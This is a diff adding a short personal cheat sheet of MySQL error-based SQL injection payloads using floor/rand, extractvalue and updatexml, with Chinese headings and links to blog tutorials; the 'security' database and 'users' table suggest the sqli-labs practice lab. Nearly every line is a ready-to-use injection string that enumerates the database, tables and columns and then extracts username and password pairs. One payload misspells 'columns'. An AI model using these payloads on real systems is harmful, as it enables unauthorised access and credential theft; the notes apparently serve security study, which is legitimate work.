@@ -1,0 +1,29 @@
+security
+
+
+1' and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.columns group by a)b)
+1' and (select 1 from(select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)
+1' and (select 1 from(select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)
+1' and (select 1 from(select count(*),concat(0x3a,0x3a,(select concat(username,0x3a,password) from users limit 0,1),0x3a,0x3a,floor(rand(0)*2)) as a from information_schema.tables group by a)b)
+
+floor报错注入
+https://blog.csdn.net/he_and/article/details/80455884
+https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&mid=403404979&idx=1&sn=27d10b6da357d72304086311cefd573e&scene=1&srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect
+https://www.cnblogs.com/litlife/p/8472323.html
+https://blog.csdn.net/Fly_hps/article/details/79416620
+
+
+1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) --+
+1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+
+1' and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e)) --+
+1' and extractvalue(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e)) --+
+
+
+1' and updatexml(0x7e,concat(0x7e,database(),0x7e),0x7e) --+
+1' and updatexml(0x7e,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),0x7e) --+
+1' and updatexml(0x7e,concat(0x7e,(select column_name from information_schema.cloumns where table_name='users' limit 0,1),0x7e),0x7e) --+
+1' and updatexml(0x7e,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),0x7e)  --+
+
+
+extractvalue()和updatexml()报错注入
+https://blog.csdn.net/zpy1998zpy/article/details/80631036
